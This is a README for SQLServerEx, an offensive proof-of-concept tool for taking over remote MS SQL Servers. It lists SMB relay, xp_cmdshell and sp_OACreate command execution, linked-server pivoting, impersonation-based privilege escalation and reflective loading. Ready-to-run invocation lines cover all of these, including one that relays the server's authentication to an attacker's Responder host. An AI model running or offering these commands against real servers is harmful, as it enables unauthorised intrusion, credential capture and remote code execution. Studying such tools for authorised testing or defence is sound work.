
### MS SQL Server Command Execution

SQLServerEx is a PoC designed to execute commands on remote MS SQL Servers via publicly known vectors. The tool was inspired by Offensive Security courses so all kudos to them, I just put some dotNETs together.

Could be executed in both interactive and non-interactive modes providing command line arguments. Current functionality includes:

* Retrieves current user roles, linked servers and logins to be impersonated.
* Smb Relay Attack.
* Command execution via Linked Servers, Xp_cmdshell, sp_OACreate, invoking DLLs.
* PrivEsc via user impersonation.
* Reflective loading via exposed StartR method.

#### Some of the running modes:

Server enumeration under current domain user context or with supplied credentials:

```
SQLServerEx.exe -s SQLSERVER1 -d master
SQLServerEx.exe -s SQLSERVER1 -d master -u sa -p Password1
```

Command execution:

```
SQLServerEx.exe -s SQLSERVER1 -d master -e relay -r RESPONDER2
SQLServerEx.exe -s SQLSERVER1 -d master -e link -l LINKEDSQLSERVER3
SQLServerEx.exe -s SQLSERVER1 -d master -e xpshell -i sa
SQLServerEx.exe -s SQLSERVER1 -d master -e sp -i dbo
SQLServerEx.exe -s SQLSERVER1 -d master -e rundll -i sa
```